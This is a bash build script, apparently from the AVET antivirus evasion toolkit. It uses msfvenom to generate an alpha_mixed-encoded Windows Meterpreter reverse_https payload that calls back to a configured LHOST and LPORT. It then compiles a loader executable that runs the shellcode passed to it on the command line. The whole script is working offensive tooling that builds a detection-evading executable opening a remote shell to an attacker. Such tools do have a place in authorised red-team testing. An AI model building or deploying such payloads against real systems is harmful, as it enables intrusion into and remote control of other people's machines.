#!/bin/bash          
# Call the generated output.exe on target, delivering the shellcode string in output/alpha_mixed.txt as command line argument

# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh

# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST

# make meterpreter reverse payload, encoded with msf alpha_mixed 
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > output/sc_alpha_mixed.txt

# no command preexec
set_command_source no_data
set_command_exec no_command

# set shellcode source
set_payload_source from_command_line_raw

# set decoder and key source
set_decoder none
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode_ASCIIMSF

# enable debug output
enable_debug_print

# compile to pwn.exe file
$win32_compiler -ffixed-eax -o output/output.exe source/avet.c
strip output/output.exe

# cleanup
cleanup_techniques

# Call the generated output.exe on target, delivering the shellcode string in output/sc_alpha_mixed.txt as command line argument
